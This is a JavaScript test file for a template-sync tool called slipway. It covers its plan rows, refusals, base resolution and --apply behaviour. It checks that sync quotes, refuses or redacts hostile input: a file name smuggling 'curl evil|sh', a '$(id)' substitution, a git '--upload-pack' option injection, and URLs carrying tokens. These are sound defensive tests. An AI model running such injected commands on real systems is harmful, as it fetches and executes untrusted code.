#!/usr/bin/env node
// sync (F-01 steps 3–5). The plan: one row kind per case, the preflight refusals, the content resolver,
// and a run that leaves every byte of the project as it was. --apply: one case per Acceptance line of
// #17. --adopt: one case per Acceptance line of #18. Internal: `pnpm meta` runs it in slipway only.
//
// Every case builds real repositories in a temp dir: a small slipway (this checkout's sync code, a
// fixture map and fixture files) with a base commit and a target commit, and a project new-project
// created from the base. `source` is that local slipway, so nothing reaches a network.

import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import { existsSync, chmodSync, copyFileSync, lstatSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync, symlinkSync, utimesSync, writeFileSync } from 'node:fs';
import { createHash } from 'node:crypto';
import { tmpdir } from 'node:os';
import { dirname, join, resolve } from 'node:path';
import test from 'node:test';
import { fileURLToPath } from 'node:url';
import { classify, loadOwnership } from '../ci/checks/lib/ownership.mjs';
import { MANIFEST, readOverrides, readProjectFile, sha256 } from '../ci/checks/lib/manifest.mjs';
import { ownDecisions } from './adopt.mjs';
import { resolveBase, sourceClone } from './lib/base.mjs';
import { syncCommand } from './lib/install.mjs';
import { appliedText, planText } from './lib/sync-text.mjs';
import { clean, ui } from './lib/ui.mjs';
import { KINDS, checkWrites, shellQuote, skillChanged, withoutOverrides } from './sync.mjs';

const SRC = resolve(dirname(fileURLToPath(import.meta.url)), '..');
const EXPECTED = join(SRC, 'scripts', 'fixtures', 'sync-plan.txt');
const EXPECTED_SUMMARY = join(SRC, 'scripts', 'fixtures', 'sync-plan-summary.txt');
const EXPECTED_ADOPT_SUMMARY = join(SRC, 'scripts', 'fixtures', 'adopt-plan-summary.txt');
// The code a slipway needs to run new-project and sync. Its fixture map makes all of it internal, so the
// plan lists fixture files only and does not change when this code does.
const CODE = ['scripts/new-project.mjs', 'scripts/sync.mjs', 'scripts/adopt.mjs', 'scripts/lib', 'ci/checks/lib', 'ci/checks/meta/d1-drift.mjs'];

const root = mkdtempSync(join(tmpdir(), 'slipway-sync-'));
test.after(() => rmSync(root, { recursive: true, force: true }));
// A known identity, no personal git config, and the clone cache inside this run's temp dir.
Object.assign(process.env, {
  GIT_CONFIG_GLOBAL: '/dev/null',
  GIT_CONFIG_NOSYSTEM: '1',
  GIT_AUTHOR_NAME: 'slipway test',
  GIT_AUTHOR_EMAIL: 'test@example.invalid',
  GIT_COMMITTER_NAME: 'slipway test',
  GIT_COMMITTER_EMAIL: 'test@example.invalid',
  TMPDIR: root,
});
delete process.env.CLAUDECODE; // --apply refuses under an agent; one case sets it back
// What a runner sets must not colour or link the output the cases read: each case that wants either passes its own.
for (const k of ['FORCE_COLOR', 'FORCE_HYPERLINK', 'NO_COLOR']) delete process.env[k];

const git = (cwd, ...args) => execFileSync('git', args, { cwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] }).trim();
const put = (dir, files) => {
  for (const [p, body] of Object.entries(files)) {
    if (body === null) rmSync(join(dir, p));
    else {
      mkdirSync(dirname(join(dir, p)), { recursive: true });
      writeFileSync(join(dir, p), body);
    }
  }
};
const commit = (dir, msg) => {
  git(dir, 'add', '-A');
  git(dir, 'commit', '-q', '-m', msg);
  return git(dir, 'rev-parse', 'HEAD');
};
function copyCode(to) {
  const cp = (rel) => {
    const from = join(SRC, rel);
    if (lstatSync(from).isDirectory()) readdirSync(from).forEach((e) => cp(join(rel, e)));
    else {
      mkdirSync(dirname(join(to, rel)), { recursive: true });
      copyFileSync(from, join(to, rel));
    }
  };
  CODE.forEach(cp);
}

const MAP_YAML = `paths:
  - glob: dev/**
    class: internal
  - glob: scripts/**
    class: internal
  - glob: ci/checks/**
    class: internal
  - glob: process/**
    class: managed
  - glob: .claude/skills/**
    class: managed
  - glob: .gitattributes
    class: managed
  - glob: docs/**
    class: seeded
  - glob: README.md
    class: internal
  - glob: .gitignore
    class: seeded
  - glob: package.json
    class: merged
`;
const pkg = (scripts) => `${JSON.stringify({ name: 'create-slipway', version: '0.0.0-fixture', bin: { 'create-slipway': 'scripts/new-project.mjs' }, scripts }, null, 2)}\n`;

// slipway: A (base) → A0 (seeded and scripts only: the same managed blobs as A, so a tie) → A1 (adds one managed
// file, nothing else) → B (target).
const slip = join(root, 'slipway');
mkdirSync(slip);
git(slip, 'init', '-q', '-b', 'main');
copyCode(slip);
put(slip, {
  'dev/ownership.yaml': MAP_YAML,
  '.gitignore': 'node_modules/\n',
  '.gitattributes': '* text=auto eol=lf\n',
  'README.md': '# slipway\n',
  'package.json': pkg({ a: 'echo a', b: 'echo b', d: 'echo d', e: 'echo e', drop: 'echo drop', gone: 'node scripts/x.mjs' }),
  'process/replace.md': 'v1\nkeep\nkeep\nkeep\nend1\n', // two hunks upstream: one project can take part of
  'process/same.md': 'same\n',
  'process/merge.md': 'one\ntwo\n',
  'process/delete.md': 'delete me\n',
  'process/kept.md': 'kept\n',
  'process/ours.md': 'ours\n',
  'process/harness/settings.json': '{ "harness": 1 }\n',
  'process/dir': 'a file, then a folder\n',
  'docs/PRD.md': '# PRD v1\n',
  'docs/same.md': 'seeded, never changed\n',
});
const A = commit(slip, 'A');
put(slip, { 'docs/PRD.md': '# PRD v1.1\n', 'package.json': pkg({ a: 'echo a1', b: 'echo b', d: 'echo d', e: 'echo e', drop: 'echo drop', gone: 'node scripts/x.mjs' }) });
const A0 = commit(slip, 'A0: docs and scripts only');
put(slip, { 'process/new.md': 'new\n' });
const A1 = commit(slip, 'A1: one slipway file added');
put(slip, {
  'package.json': pkg({ a: 'echo a2', b: 'echo b2', c: 'echo c', d: 'echo d', e: 'echo e2', gone: 'node scripts/y.mjs' }),
  'process/replace.md': 'v2\nkeep\nkeep\nkeep\nend2\n',
  'process/merge.md': 'one\ntwo, upstream\n',
  'process/delete.md': null,
  'process/kept.md': null,
  'process/clash.md': 'slipway clash\n',
  'process/harness/settings.json': '{ "harness": 2 }\n',
  'docs/PRD.md': '# PRD v2\n',
  'README.md': '# slipway\n\n<img src="dev/assets/logo-lockup.png">\n',
  'process/hooks/new.sh': '#!/bin/sh\necho new hook\n',
  'process/dir': null,
  'process/dir/index.md': 'now a folder\n',
});
chmodSync(join(slip, 'process/hooks/new.sh'), 0o755);
const B = commit(slip, 'B');

// The project, from A, then edited by its owner in every way the plan distinguishes.
git(slip, 'checkout', '-q', A);
const base = join(root, 'base-project');
const np = spawnSync(process.execPath, [join(slip, 'scripts', 'new-project.mjs'), base, '--no-github', '--no-harness'], {
  encoding: 'utf8',
  env: { ...process.env, SLIPWAY_SOURCE: slip },
});
assert.equal(np.status, 0, `new-project failed:\n${np.stdout}\n${np.stderr}`);
git(slip, 'checkout', '-q', 'main');
const baseManifest = JSON.parse(readFileSync(join(base, MANIFEST), 'utf8'));
assert.equal(baseManifest.slipway, A);
const projPkg = JSON.parse(readFileSync(join(base, 'package.json'), 'utf8'));
projPkg.scripts.b = 'echo mine';
projPkg.scripts.e = 'echo e2'; // already upstream's new value
put(base, {
  'package.json': `${JSON.stringify(projPkg, null, 2)}\n`,
  'process/merge.md': 'one\ntwo\nthree, ours\n',
  'process/kept.md': 'kept, edited\n',
  'process/ours.md': 'ours, edited\n',
  'process/clash.md': 'our own file\n',
  'docs/PRD.md': '# Our PRD\n',
  '.slipway/overrides.yaml': 'overrides:\n  - path: process/merge.md\n    reason: our third line\n  - path: process/kept.md\n    reason: we still use it\n  - path: process/ours.md\n    reason: our wording\n',
});
commit(base, 'owner edits');

let n = 0;
// A fresh clone of the edited project per case, on main.
function project(edit) {
  const dir = join(root, `project-${++n}`);
  git(root, 'clone', '-q', base, dir);
  if (edit) edit(dir);
  return dir;
}
const sync = (dir, ...args) =>
  spawnSync(process.execPath, [join(slip, 'scripts', 'new-project.mjs'), 'sync', ...args], { cwd: dir, encoding: 'utf8' });
const rows = (stdout) => Object.fromEntries([...stdout.matchAll(/^ {2}(\S.*?) {2,}(\S+(?: scripts\.\S+)?)$/gm)].map((m) => [m[2], m[1]]));
const normalise = (stdout) => stdout.replaceAll(slip, '<slipway>').replaceAll(A, '<A>').replaceAll(B, '<B>').replaceAll(B.slice(0, 12), '<B>').replaceAll(A.slice(0, 7), '<A>').replaceAll(B.slice(0, 7), '<B>');

// Every file under `dir`, .git included, with its bytes: what "nothing was written" means.
function treeHash(dir) {
  const h = createHash('sha256');
  const walk = (d) => {
    for (const e of readdirSync(d).sort()) {
      const p = join(d, e);
      const st = lstatSync(p);
      h.update(`${p.slice(dir.length)}\0${st.mode}\0`);
      if (st.isDirectory()) walk(p);
      else h.update(readFileSync(p));
    }
  };
  walk(dir);
  return h.digest('hex');
}

test('the plan from base A to target B equals the checked-in plan, and writes nothing', () => {
  const dir = project();
  // A tracked file newer than the index: a plain `git status` would rewrite the index to refresh it.
  const later = new Date(Date.now() + 60_000);
  utimesSync(join(dir, 'process/same.md'), later, later);
  const before = treeHash(dir);
  const r = sync(dir, '--verbose');
  assert.equal(r.status, 0, r.stderr);
  assert.equal(treeHash(dir), before, 'sync wrote to the project');
  assert.equal(git(dir, 'status', '--porcelain'), '');
  assert.equal(normalise(r.stdout), readFileSync(EXPECTED, 'utf8'));
});

test('the default plan is for the owner: what needs them first with each next step, what changes in counts, the next command last; --verbose is the checked-in list above', () => {
  const dir = project();
  const r = sync(dir);
  assert.equal(r.status, 0, r.stderr);
  assert.equal(normalise(r.stdout), readFileSync(EXPECTED_SUMMARY, 'utf8'));
  assert.doesNotMatch(r.stdout, /process\/same\.md/);
});

test('a project with the use-slipway script is told `pnpm -s use-slipway sync --apply`, and one without it the long form (#90)', () => {
  const dir = project((d) => {
    const pkg = JSON.parse(readFileSync(join(d, 'package.json'), 'utf8'));
    pkg.scripts['use-slipway'] = 'npx --loglevel=error github:matldupont/slipway#main';
    writeFileSync(join(d, 'package.json'), JSON.stringify(pkg, null, 2) + '\n');
    commit(d, 'add the use-slipway script');
  });
  const r = sync(dir);
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /└ {2}Next: pnpm -s use-slipway sync --apply\n$/);
  assert.match(r.stdout, /next: pnpm -s use-slipway sync --apply keeps your value/);
  assert.doesNotMatch(r.stdout, /npx github:/);
  assert.match(sync(project()).stdout, /└ {2}Next: npx github:matldupont\/slipway#main sync --apply\n$/);
});

// The command the owner is told to run, with slipway's shipped script, when sync exits 1 for a row that
// needs them (#135): sync's own output and exit code, and no package-manager line after it. The script's
// package is swapped for a local stand-in that prints and exits 1, so nothing reaches a network.
test('`pnpm -s use-slipway sync` with the shipped script: exit 1 kept, no ELIFECYCLE line and no npm warn lines', () => {
  const script = JSON.parse(readFileSync(join(SRC, 'package.json'), 'utf8')).scripts['use-slipway'];
  const spec = 'github:matldupont/slipway#main';
  assert.ok(script.startsWith('npx ') && script.endsWith(` ${spec}`), script);
  const stand = mkdtempSync(join(root, 'stand-in-'));
  put(stand, {
    'package.json': '{ "name": "stand-in", "version": "1.0.0", "bin": { "stand-in": "cli.mjs" } }\n',
    'cli.mjs': '#!/usr/bin/env node\nconsole.log(`Sync exits 1: ${process.argv.slice(2).join(" ")}`);\nprocess.exitCode = 1;\n',
  });
  chmodSync(join(stand, 'cli.mjs'), 0o755);
  const dir = mkdtempSync(join(root, 'use-slipway-'));
  writeFileSync(join(dir, 'package.json'), `${JSON.stringify({ name: 'p', private: true, scripts: { 'use-slipway': script.replace(spec, stand) } })}\n`);
  const [bin, ...args] = syncCommand(dir).split(' ');
  assert.equal(bin, 'pnpm');
  // As an owner's terminal has it: none of the npm_* settings a package manager running this test set.
  const env = Object.fromEntries(Object.entries(process.env).filter(([k]) => !/^npm_/i.test(k)));
  const r = spawnSync(bin, [...args, '--apply'], { cwd: dir, encoding: 'utf8', env: { ...env, npm_config_cache: join(root, 'npm-cache') } });
  const all = r.stdout + r.stderr;
  assert.equal(r.status, 1, all);
  assert.match(r.stdout, /^Sync exits 1: sync --apply\n$/);
  assert.doesNotMatch(all, /ELIFECYCLE|npm warn/i);
});

test('the owner sees none of the ownership words: not in the plan, the verbose plan, the adopt plan or an apply (D-016)', () => {
  const ids = /pristine|seeded|managed|merged|\bP[LD]-/i;
  const dir = project();
  const outputs = [sync(dir).stdout, sync(dir, '--verbose').stdout, adopt(unadopted()).stdout, adopt(unadopted(), '--verbose').stdout, sync(project(), '--apply').stdout];
  for (const o of outputs) assert.doesNotMatch(o, ids);
});

// One case per row kind: which fixture path produces it, and why.
const KIND_CASES = [
  ['replace', 'process/replace.md', 'managed, pristine, changed upstream'],
  ['merge', 'process/merge.md', 'managed, overridden, changed upstream'],
  ['add', 'process/new.md', 'new upstream, absent in the project'],
  ['delete', 'process/delete.md', 'removed upstream, pristine'],
  ['keep (edited)', 'process/kept.md', 'removed upstream, edited under an override'],
  ['collision', 'process/clash.md', 'new upstream, the project has its own file there'],
  ["yours — slipway's template changed", 'docs/PRD.md', 'seeded, slipway changed its copy'],
  ['script updated', 'package.json scripts.a', 'the project still has the base value'],
  ['script updated', 'package.json scripts.c', 'a key new upstream'],
  ['script updated', 'package.json scripts.drop', 'a key removed upstream, still at its base value'],
  ['script kept, yours differs', 'package.json scripts.b', 'the project changed the value'],
  ['unchanged', 'process/same.md', 'managed, same on both sides'],
  ['unchanged', 'process/ours.md', 'managed, overridden, unchanged upstream: nothing to merge'],
  ['unchanged', 'docs/same.md', 'seeded, same on both sides'],
];
const planned = rows(sync(project(), '--verbose').stdout);
for (const [kind, path, why] of KIND_CASES) {
  test(`row ${kind}: ${path} — ${why}`, () => assert.equal(planned[path], kind));
}
test('a key that calls an internal path on both sides (changed upstream), an unchanged key, and one the project already has at the target value make no row', () => {
  assert.equal(planned['package.json scripts.gone'], undefined);
  assert.equal(planned['package.json scripts.e'], undefined);
  assert.equal(planned['package.json scripts.d'], undefined);
});

test('refuses a dirty tree, a detached HEAD, D1 red and a missing manifest — each by name, writing nothing', () => {
  const cases = [
    [(d) => put(d, { 'notes.txt': 'untracked\n' }), /the working tree is not clean \(1 path\(s\)\)[\s\S]*notes\.txt/],
    [(d) => git(d, 'checkout', '-q', '--detach'), /HEAD is detached/],
    [(d) => { put(d, { 'process/same.md': 'edited without an override\n' }); commit(d, 'drift'); }, /D1 is red[\s\S]*drift\/process\/same\.md/],
    [(d) => { rmSync(join(d, MANIFEST)); commit(d, 'no manifest'); }, /no \.slipway\/manifest\.json — run `sync --adopt`/],
    [(d) => {
      const m = JSON.parse(readFileSync(join(d, MANIFEST), 'utf8'));
      m.files['docs/x\n\nharness — installed'] = { class: 'seeded', sha256: '0'.repeat(64) };
      put(d, { [MANIFEST]: JSON.stringify(m) });
      commit(d, 'planted path');
    }, /"docs\/x\\u000a\\u000aharness — installed" holds a control character/],
  ];
  for (const [edit, why] of cases) {
    const dir = project(edit);
    const before = treeHash(dir);
    const status = git(dir, 'status', '--porcelain');
    for (const args of [[], ['--apply']]) {
      const r = sync(dir, ...args);
      assert.equal(r.status, 1, `${why} ${args}: exit ${r.status}\n${r.stdout}`);
      assert.match(r.stderr, why);
      assert.equal(r.stdout, '');
      assert.doesNotMatch(r.stderr, /[\u0000-\u0009\u000b-\u001f\u007f-\u009f]/, `${why}: raw control character in the refusal`);
      assert.equal(treeHash(dir), before, `${args} wrote to the project`);
      assert.equal(git(dir, 'status', '--porcelain'), status);
    }
  }
});

test('with "slipway": null the base is found by blobs alone: the newest exact commit — A0, which shares A\'s managed blobs, never A1', () => {
  const dir = project((d) => {
    const m = JSON.parse(readFileSync(join(d, MANIFEST), 'utf8'));
    m.slipway = null;
    writeFileSync(join(d, MANIFEST), `${JSON.stringify(m, null, 2)}\n`);
    commit(d, 'no hint');
  });
  const r = sync(dir, '--verbose');
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, new RegExp(`base: {3}${A0} `));
  // The known limitation (F-01): the tie changes only advisory rows — here scripts.a, which A0 changed.
  const got = rows(r.stdout);
  assert.equal(got['package.json scripts.a'], 'script kept, yours differs');
  for (const [path, kind] of Object.entries(planned)) if (path !== 'package.json scripts.a') assert.equal(got[path], kind, path);
});

test('a manifest whose blobs match no commit exactly stops, naming the closest commit and its count', () => {
  const dir = project((d) => {
    const m = JSON.parse(readFileSync(join(d, MANIFEST), 'utf8'));
    m.files['process/same.md'].blob = '0'.repeat(40);
    writeFileSync(join(d, MANIFEST), `${JSON.stringify(m, null, 2)}\n`);
    commit(d, 'a blob from nowhere');
  });
  const total = Object.values(baseManifest.files).filter((f) => f.class === 'managed').length;
  const r = sync(dir);
  assert.equal(r.status, 1);
  assert.match(r.stderr, new RegExp(`no slipway commit holds exactly the manifest's ${total} slipway files; closest ${A.slice(0, 12)} \\(${total - 1} of ${total} of slipway's files at their blob\\), then ${A0.slice(0, 12)} \\(${total - 1} of ${total} of slipway's files at their blob\\)`));
});

test('a manifest recorded before slipway rewrote its history: names the closest commit, each differing file and the command, and the command re-points the project', () => {
  const old = 'the text before the rewrite\n';
  const dir = project((d) => {
    const m = JSON.parse(readFileSync(join(d, MANIFEST), 'utf8'));
    m.files['process/same.md'].blob = execFileSync('git', ['hash-object', '--stdin'], { input: old, encoding: 'utf8' }).trim();
    m.files['process/ours.md'].blob = '0'.repeat(40); // the project's own edit: matches neither the record nor the commit
    m.files['process/same.md'].sha256 = sha256(Buffer.from(old));
    writeFileSync(join(d, MANIFEST), `${JSON.stringify(m, null, 2)}\n`);
    put(d, { 'process/same.md': old });
    commit(d, 'as adopted before the rewrite');
  });
  const before = treeHash(dir);
  const r = sync(dir);
  assert.equal(r.status, 1);
  assert.equal(treeHash(dir), before, 'sync wrote to the project');
  const [first] = r.stderr.split('\n');
  assert.match(first, /^sync: slipway's history was changed after this project recorded its version/);
  assert.doesNotMatch(first, /[0-9a-f]{40}|\b[A-Z]\d\b/, 'a blob id or check id in the first line');
  assert.match(r.stderr, new RegExp(`nearest one is ${A.slice(0, 12)}, which differs in:\\n {2}process/same\\.md\\n {2}process/ours\\.md`));
  const cmd = `git switch -c slipway/re-point && git rm -q ${MANIFEST} && git commit -qm "chore: drop the slipway record for a rewritten history" && npx github:matldupont/slipway#main sync --adopt --apply --base ${A} --revert process/same.md\n`;
  assert.ok(r.stderr.includes(cmd), r.stderr);
  assert.match(r.stderr, /You changed this file yourself[^\n]*\n {2}process\/ours\.md/);
  assert.doesNotMatch(cmd, /process\/ours\.md/, 'a file the project edited is restored silently');
  assert.match(r.stderr, /Nothing was written\.$/m);

  // The printed command works: the record is re-pointed and slipway's copy is back.
  git(dir, 'switch', '-c', 'slipway/re-point');
  git(dir, 'rm', '-q', MANIFEST);
  git(dir, 'commit', '-qm', 'drop the record');
  const a = adopt(dir, '--apply', '--base', A, '--revert', 'process/same.md');
  assert.equal(a.status, 0, a.stderr);
  assert.equal(bytes(dir, 'process/same.md').toString(), show(A, 'process/same.md').toString());
  assert.equal(manifestOf(dir).slipway, A);
});

// A source that serves a commit no branch holds, as GitHub does for a history it rewrote: a partial clone of
// it fetches that commit on demand, so an existence check finds it. `orphan` ships A's tree but for one file.
function sourceWithUnreachable(text) {
  const dir = join(root, `slipway-promisor-${++n}`);
  git(root, 'clone', '-q', slip, dir);
  git(dir, 'config', 'uploadpack.allowFilter', 'true');
  git(dir, 'config', 'uploadpack.allowAnySHA1InWant', 'true');
  git(dir, 'checkout', '-q', '--orphan', 'gone', A);
  put(dir, { 'process/same.md': text });
  const orphan = commit(dir, 'the version before the rewrite');
  git(dir, 'checkout', '-q', 'main');
  git(dir, 'branch', '-q', '-D', 'gone');
  return { url: `file://${dir}`, orphan };
}

test('a recorded commit that exists in the source but on no branch is not the base: sync refuses as it does for a rewritten history (#84)', () => {
  const old = 'the text before the rewrite\n';
  const { url, orphan } = sourceWithUnreachable(old);
  // The trap: the clone sync makes finds the commit, and the walk does not reach it.
  const gitDir = sourceClone(url);
  assert.equal(git(gitDir, 'cat-file', '-t', orphan), 'commit');
  assert.ok(!git(gitDir, 'rev-list', 'HEAD').split('\n').includes(orphan));
  const dir = project((d) => {
    const m = JSON.parse(readFileSync(join(d, MANIFEST), 'utf8'));
    m.source = url;
    m.slipway = orphan;
    m.files['process/same.md'].blob = execFileSync('git', ['hash-object', '--stdin'], { input: old, encoding: 'utf8' }).trim();
    m.files['process/same.md'].sha256 = sha256(Buffer.from(old));
    writeFileSync(join(d, MANIFEST), `${JSON.stringify(m, null, 2)}\n`);
    put(d, { 'process/same.md': old });
    commit(d, 'as adopted before the rewrite');
  });
  const before = treeHash(dir);
  for (const args of [[], ['--apply']]) {
    const r = sync(dir, ...args);
    assert.equal(r.status, 1, r.stdout);
    assert.equal(r.stdout, '', 'a plan printed for a base that is gone');
    assert.match(r.stderr, /^sync: slipway's history was changed after this project recorded its version/);
    assert.match(r.stderr, new RegExp(`nearest one is ${A0.slice(0, 12)}, which differs in:\\n {2}process/same\\.md\\n`));
    assert.match(r.stderr, new RegExp(`sync --adopt --apply --base ${A0} --revert process/same\\.md\\n`));
    assert.match(r.stderr, /Nothing was written\.$/m);
    assert.equal(treeHash(dir), before, 'sync wrote to the project');
  }
});

test('resolveBase: a start commit the walk does not reach is not tried first (#84)', () => {
  const { url, orphan } = sourceWithUnreachable('old\n');
  const gitDir = sourceClone(url);
  const blobs = new Map([['process/same.md', git(gitDir, 'rev-parse', `${orphan}:process/same.md`)]]);
  const r = resolveBase(gitDir, blobs, { start: orphan });
  assert.equal(r.exact, null);
  assert.notEqual(r.best.sha, orphan);
  assert.equal(resolveBase(gitDir, blobs, { start: orphan }).total, resolveBase(gitDir, blobs).total);
});

test('a target that shares no history with the base is refused in the plan and in --apply, with no commit list (#84)', () => {
  // The running slipway is a commit with a history of its own, and the source (the manifest's) holds it on a branch.
  const unrelated = join(root, 'slipway-unrelated');
  git(root, 'clone', '-q', slip, unrelated);
  git(unrelated, 'checkout', '-q', '--orphan', 'fresh');
  put(unrelated, { 'process/same.md': 'a history of its own\n' });
  commit(unrelated, 'a slipway with no shared history');
  const source = join(root, 'slipway-holds-both');
  git(root, 'clone', '-q', slip, source);
  git(source, 'fetch', '-q', unrelated, 'fresh:other');
  const dir = project((d) => {
    const m = JSON.parse(readFileSync(join(d, MANIFEST), 'utf8'));
    m.source = source;
    writeFileSync(join(d, MANIFEST), `${JSON.stringify(m, null, 2)}\n`);
    commit(d, 'a source that holds both');
  });
  const before = treeHash(dir);
  for (const args of [[], ['--apply']]) {
    const r = spawnSync(process.execPath, [join(unrelated, 'scripts', 'new-project.mjs'), 'sync', ...args], { cwd: dir, encoding: 'utf8' });
    assert.equal(r.status, 1, r.stdout);
    assert.doesNotMatch(r.stdout, /Nothing needs you|commits, base → target/);
    assert.match(r.stderr, /share no history in \S+, so sync cannot say what changed between them; nothing was written/);
    assert.equal(treeHash(dir), before, 'sync wrote to the project');
  }
});

test('the re-point command quotes a path the shell would read as more than a name', () => {
  assert.equal(shellQuote('process/a.md'), 'process/a.md');
  assert.equal(shellQuote('x;curl evil|sh;.md'), "'x;curl evil|sh;.md'");
  assert.equal(shellQuote("it's $(id).md"), "'it'\\''s $(id).md'");
});

test('resolveBase: closest-match mode ranks every commit and names the runner-up', () => {
  const gitDir = sourceClone(slip);
  const blobs = new Map([['process/replace.md', git(slip, 'rev-parse', `${A}:process/replace.md`)]]);
  const r = resolveBase(gitDir, blobs);
  assert.equal(r.exact, null);
  assert.equal(r.total, 1);
  assert.deepEqual(r.best, { sha: A0, matched: 1, extra: 8 });
  assert.deepEqual(r.runnerUp, { sha: A, matched: 1, extra: 8 });
});

test('from a packed install (no .git, no .gitignore) of B: the target is B by content, and .gitignore is compared with B\'s own', () => {
  const pkgDir = join(root, 'packed-b');
  mkdirSync(pkgDir);
  execFileSync('tar', ['-x', '-C', pkgDir], { input: execFileSync('git', ['-C', slip, 'archive', B]) });
  rmSync(join(pkgDir, '.gitignore'));
  const r = spawnSync(process.execPath, [join(pkgDir, 'scripts', 'new-project.mjs'), 'sync', '--verbose'], { cwd: project(), encoding: 'utf8' });
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, new RegExp(`target: ${B}\n`));
  assert.equal(rows(r.stdout)['.gitignore'], 'unchanged');
  assert.doesNotMatch(r.stdout, /note:/);
});

test('the clone of slipway is gone when sync exits, and when it is interrupted', () => {
  const clones = (tmp) => readdirSync(tmp).filter((e) => e.startsWith('slipway-sync-'));
  const plain = mkdtempSync(join(root, 'tmp-'));
  const r = spawnSync(process.execPath, [join(slip, 'scripts', 'new-project.mjs'), 'sync'], { cwd: project(), encoding: 'utf8', env: { ...process.env, TMPDIR: plain } });
  assert.equal(r.status, 0, r.stderr);
  assert.deepEqual(clones(plain), []);
  const killed = mkdtempSync(join(root, 'tmp-'));
  const code = `const { sourceClone } = await import(${JSON.stringify(join(slip, 'scripts', 'lib', 'base.mjs'))}); sourceClone(${JSON.stringify(slip)}); process.kill(process.pid, 'SIGINT'); await new Promise((r) => setTimeout(r, 5000));`;
  const k = spawnSync(process.execPath, ['--input-type=module', '-e', code], { encoding: 'utf8', env: { ...process.env, TMPDIR: killed } });
  assert.equal(k.status, 130, k.stderr);
  assert.deepEqual(clones(killed), []);
});

test('an empty source is a named refusal, not a stack trace', () => {
  const empty = join(root, 'empty-slipway');
  mkdirSync(empty);
  git(empty, 'init', '-q', '-b', 'main');
  const dir = project((d) => {
    const m = JSON.parse(readFileSync(join(d, MANIFEST), 'utf8'));
    m.source = empty;
    writeFileSync(join(d, MANIFEST), `${JSON.stringify(m, null, 2)}\n`);
    commit(d, 'an empty source');
  });
  const r = sync(dir);
  assert.equal(r.status, 1, r.stderr);
  assert.match(r.stderr, /^sync: (cannot read slipway's history from|could not fetch slipway from) /);
  assert.doesNotMatch(r.stderr, /\n\s+at /);
});

test('the bin dispatches sync and sync --adopt; --plan with --apply is refused; a sync source that reads as an option is refused', () => {
  assert.match(sync(root, '--help').stdout, /^usage: sync \[--plan \| --apply\]/);
  assert.match(sync(root, '--adopt', '--help').stdout, /^usage: sync --adopt /);
  assert.match(sync(project(), '--plan', '--apply').stderr, /--plan and --apply: choose one/);
  assert.throws(() => sourceClone('--upload-pack=touch x'), /reads as a git option/);
  // A transport prefix would carry a token past the redaction into the header and the manifest.
  assert.throws(() => sourceClone('https::https://u:TOKEN@example.invalid/r.git'), (e) => /names a git transport helper/.test(e.message) && !e.message.includes('TOKEN'));
  // git's own failure message quotes the URL; the error does not carry the token.
  // git drops userinfo from its own messages itself, but keeps a query: that part is sync's to redact.
  assert.throws(() => sourceClone('https://u:TOKEN@unreachable.invalid/r.git?token=SECRET'), (e) => /could not fetch slipway from https:\/\/unreachable\.invalid\/r\.git: /.test(e.message) && !/TOKEN|SECRET/.test(e.message));
});

// ---- --apply (F-01 step 4, #17): one case per Acceptance line

const short = (sha) => sha.slice(0, 12);
const BRANCH = `slipway/sync-${short(B)}`;
const show = (sha, p) => execFileSync('git', ['-C', slip, 'show', `${sha}:${p}`]);
const bytes = (dir, p) => readFileSync(join(dir, p));
const manifestOf = (dir) => JSON.parse(readFileSync(join(dir, MANIFEST), 'utf8'));
// Slipway B's managed files, by the fixture map: process/** and .gitattributes.
const managedAtB = git(slip, 'ls-tree', '-r', '--name-only', B).split('\n').filter((p) => p.startsWith('process/') || p === '.gitattributes');

test('apply, pristine project: every managed file equals the target, the manifest records B, one commit on slipway/sync-<B>, main unchanged', () => {
  const dir = project((d) => git(d, 'reset', '-q', '--hard', 'HEAD~1')); // before the owner's edits
  const main = git(dir, 'rev-parse', 'main');
  const mainTree = git(dir, 'rev-parse', 'main^{tree}');
  const r = sync(dir, '--apply');
  assert.equal(r.status, 0, r.stdout + r.stderr);
  assert.equal(git(dir, 'symbolic-ref', '--short', 'HEAD'), BRANCH);
  assert.equal(git(dir, 'rev-parse', 'main'), main);
  assert.equal(git(dir, 'rev-parse', 'main^{tree}'), mainTree);
  assert.equal(git(dir, 'rev-parse', 'HEAD~1'), main);
  assert.equal(git(dir, 'status', '--porcelain'), '');
  const m = manifestOf(dir);
  assert.equal(m.slipway, B);
  for (const p of managedAtB) {
    assert.deepEqual(bytes(dir, p), show(B, p), p);
    assert.equal(m.files[p].blob, git(slip, 'rev-parse', `${B}:${p}`), p);
  }
  const managed = Object.entries(m.files).filter(([, f]) => f.class === 'managed').map(([p]) => p);
  assert.deepEqual(managed.sort(), [...managedAtB].sort());
  assert.equal(readProjectFile(dir, 'process/delete.md'), null);
  // A file slipway ships executable arrives executable: a hook it adds must run.
  assert.ok(statSync(join(dir, 'process/hooks/new.sh')).mode & 0o100, 'process/hooks/new.sh lost its executable bit');
  assert.match(git(dir, 'ls-tree', 'HEAD', 'process/hooks/new.sh'), /^100755 /);
  assert.deepEqual(JSON.parse(bytes(dir, 'package.json')).scripts, { a: 'echo a2', b: 'echo b2', c: 'echo c', d: 'echo d', e: 'echo e2' });
  // --no-harness: nothing installed, so nothing to update, and the owner is told how.
  assert.equal(readProjectFile(dir, '.claude/settings.json'), null);
  assert.match(r.stdout, /\.claude\/settings\.json is not installed, so it was left out/);
  // The rewritten manifest resolves: the next sync finds B as its base and has nothing to do.
  const again = sync(dir, '--verbose');
  assert.equal(again.status, 0, again.stderr);
  assert.match(again.stdout, new RegExp(`base: {3}${B} `));
  assert.deepEqual(new Set(Object.values(rows(again.stdout))), new Set(['unchanged']));
  const noop = sync(dir, '--apply');
  assert.equal(noop.status, 0, noop.stderr);
  assert.match(noop.stdout, /Already at .* nothing to apply, nothing written/);
  assert.equal(git(dir, 'symbolic-ref', '--short', 'HEAD'), BRANCH);
});

// The owner-edited project, applied once; each case below reads its result.
const edited = project();
const editedMain = git(edited, 'rev-parse', 'main');
const kept = ['docs/PRD.md', 'process/kept.md', 'process/clash.md', '.slipway/overrides.yaml'].map((p) => [p, bytes(edited, p)]);
const ourMerge = bytes(edited, 'process/merge.md').toString('utf8');
